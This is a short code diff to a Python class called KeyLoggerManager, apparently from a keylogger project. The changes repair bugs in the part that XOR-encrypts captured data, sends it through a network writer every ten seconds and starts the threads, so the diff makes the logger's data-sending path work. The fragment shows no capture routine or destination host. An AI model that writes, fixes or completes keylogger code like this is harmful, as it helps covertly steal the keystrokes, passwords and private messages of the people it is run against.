@@ -34,7 +34,7 @@ class KeyLoggerManager:
         while self.instance.return_action():
             encrypted_data = self.xor_encryption()
             if self.mode == "network":
-                stop_key_logger = writer.write(encrypted_data)
+                stop_key_logger = self.writer.write(encrypted_data)
                 if not stop_key_logger:
                     self.instance.start()
                 time.sleep(10)
@@ -50,7 +50,7 @@ class KeyLoggerManager:
     def main(self):
         threading.Thread(target=self.start).start()
         time.sleep(0.1)
-        threading.Thread(target=self.write_data()).start()
+        threading.Thread(target=self.write_data).start()
 
 
 
